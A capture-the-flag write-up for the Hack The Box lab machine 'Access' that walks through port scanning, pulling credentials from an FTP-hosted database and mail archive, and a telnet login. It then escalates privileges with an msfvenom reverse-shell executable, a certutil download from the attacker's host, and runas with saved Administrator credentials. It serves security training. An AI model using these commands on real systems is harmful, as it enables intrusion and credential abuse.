---
title: HTB : Access
permalink: /access
location:
---

# Access

**Machine Information**

	IP : 10.10.10.98
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan` which should reveal three open ports: `21`, `23`, and `80`.

```
rustscan -a 10.10.10.98 -- -sC -sV
```

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet? syn-ack
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Getting a Foothold

**FTP**

An FTP server is running on port 21 and we can sign in as an anonymous user.

```
ftp 10.10.10.98
```

After exploring the `Backups` and `Engineer` directory we find two files that we can download. `Access Control.zip` and `backup.mdb`.

```
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb

ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
```

Download both of these files from the FTP server. If you are having issues downloading files try turning passive mode off and changing to binary mode.

```
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> binary
200 Type set to I.
```

**MDBTools**

The file `Access Control.zip` is password protected so we can move on. For accessing the `backup.mdb` file I used `mdb-tables` which can be installed with the following command:

```
sudo apt install mdbtools
```

Use `mdb-tables` to dump the table information.

```
mdb-tables backup.mdb
```

From the output there is a table called `auth_user` that could be useful. Dumping the contents of the table reveals some credentials.

```
mdb-json backup.mdb auth_user
```

```json
{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
{"id":27,"username":"engineer","password":"REDACTED","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
```

Use the user credentials for `Engineer` to extract the `Access Control.zip` archive. This will reveal a file called `Access Control.pst` which can be read using the tool `readpst`. To install this use the following command:

```
sudo apt install pst-utils
```

Running this tool on the `Access Control.pst`file will create a new file called `Access Control.mbox` which is an email.

```
readpst 'Access Control.pst'  
```

Open this email to find the credentials for the `security` account.

```
...
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
...
```

**Telnet**

We can try to login into `telnet` using the credentials for the `security` user.

```
telnet -l security 10.10.10.98
```

Success!

```
*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

The user flag can be found in the following directory:

```
C:\Users\security\Desktop\user.txt
```

### Privilege Escalation

**Stored Credentials**

During our initial enumeration we find stored credentials for the `Administrator` account.

```
cmdkey /list
```

```
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

We can impersonate the `Administrator` using their stored credentials to gain access to their account. Create a reverse shell executable using `msfvenom`.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe > shelly.exe
```

Upload the payload to the target machine.

```
python -m http.server 80
```

```
certutil -urlcache -split -f http://10.10.14.4/shelly.exe shelly.exe
```

Start a `netcat` listener on our attack machine. Once listening we can run this executable as the `Administrator` user with the `runas` command to gain a shell with elevated privileges.

```
rlwrap nc -nvlp 9001
```

```
runas /savecred /user:ACCESS\Administrator "C:\Users\security\shelly.exe"
```

Success!

```
C:\Windows\system32>whoami
access\administrator
```

The root flag can be found in the following directory:

```
C:\Users\Administrator\Desktop\root.txt
```
